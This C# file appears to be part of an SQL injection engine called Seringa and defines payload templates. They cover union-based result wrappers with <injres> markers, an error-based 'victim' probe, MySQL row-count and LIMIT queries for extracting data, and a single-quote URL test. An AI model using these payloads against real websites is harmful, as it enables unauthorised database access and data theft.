using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Seringa.Engine.Utils;

namespace Seringa.Engine.Static
{
    public class GeneralPayloads
    {
        public static string UnionBasedResultSeparator = "|||";
        public static string UnionBasedErrorMessage = "The used SELECT statements have a different number of columns";
        public static string UnionBasedSelectValue = "<injres>{0}</injres>";
        public static string UnionBasedTestValue = "<injres>";
        public static string UnionBasedSelectResultWrapper = "concat("+UrlHelpers.HexEncodeValue("<injres>")+",({0}),"+UrlHelpers.HexEncodeValue("</injres>")+")";
        public static string UnionBasedSelectCountedResultWrapperPart1 = "CONCAT(";
        public static string UnionBasedSelectCountedResultWrapperPart2 = "<injres>{0}" + UnionBasedResultSeparator;
        public static string UnionBasedSelectCountedResultWrapperPart3 = ",({0})," + UrlHelpers.HexEncodeValue("</injres>") + ")";
        public static string ErrorBasedVictimIdentifier = "SELECT " + UrlHelpers.HexEncodeValue("victim");
        public static string ErrorBasedVictimConfirmationResult = "victim";
        public static string QueryResultCount = "SELECT count(*) FROM ({0}) cq";
        public static string MysqlSingleResultLimiterQuery = "{0} LIMIT {1},1";
        public static string MssqlSingleResultLimiterQuery = "";//@TODO: add this
        public static string UrlVulnerabilityTestingAppendix = "'";
    }
}
